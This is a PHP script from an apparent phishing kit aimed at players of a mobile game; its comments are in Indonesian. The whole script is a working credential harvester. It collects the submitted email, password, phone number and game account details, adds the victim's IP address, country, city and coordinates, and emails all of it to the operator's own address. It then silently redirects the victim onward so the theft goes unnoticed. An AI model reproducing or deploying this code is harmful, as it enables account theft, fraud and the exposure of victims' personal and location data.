<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/geolocation.php';
include 'system/get_flag.php';
include 'system/get_callingcode.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$phone = $_POST['phone'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$rpl = $_POST['rpl'];
$platform = $_POST['platform'];
$login = $_POST['login'];

//MENDAPATKAN KODE PANGGILAN NEGARA
$callingcode = $arpantek_callingcode['country_code'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$hasil_arpantek_flag | +$callingcode | PUNYA SI $email | LEVEL $level | TIER $tier | LOGIN $login";
$pesan = '
<center> 
</div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIER LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>RP TYPE</th>
<th style="width: 78%; text-align: center;"><b>'.$rpt.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>RP LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$rpl.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PLATFORM</th>
<th style="width: 78%; text-align: center;"><b>'.$platform.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['continent'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CALLING CODE</th>
<th style="width: 78%; text-align: center;"><b>+'.$callingcode.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['region'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['query'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='arpantek' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
}
?>